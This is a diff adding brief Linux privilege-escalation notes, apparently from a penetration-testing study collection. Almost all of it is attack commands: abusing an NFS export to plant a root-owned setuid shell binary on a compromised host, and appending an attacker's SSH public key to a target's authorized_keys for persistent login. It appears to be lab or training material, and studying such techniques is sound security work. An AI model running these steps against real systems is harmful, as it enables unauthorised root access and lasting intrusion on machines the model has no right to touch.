@@ -1,0 +1,32 @@
+Linux Privelege Escalation
+	--see privesc_commands.txt in this directory for a quick and dirty list of nix privesc enumeration commands
+	--let's focus here instead on service/configuraiton/common suid program targets and less obvious techniques
+
+
+
+NFS
+	(1) Create a suid binary as root from a remote (attacker-controlled) mountpoint
+		On attacker host:
+cd /mnt && mkdir mountpoint
+mount -t nfs 10.11.1.111:/tmp mountpoint
+chown root:root shell
+chmod u+s shell
+		On shelled host:
+cd /tmp
+./shell
+
+
+SSH
+	(1) add an arbitrary key to ~/.ssh/authorized_keys
+		On attacker host:
+ssh-keygen
+cd .ssh
+ls
+xclip id_rsa.pub
+		On shelled host:
+xclip -o -sel clip >> authorized_keys
+		On attacker host:
+ssh -i id_rsa user@target.dom
+
+
+
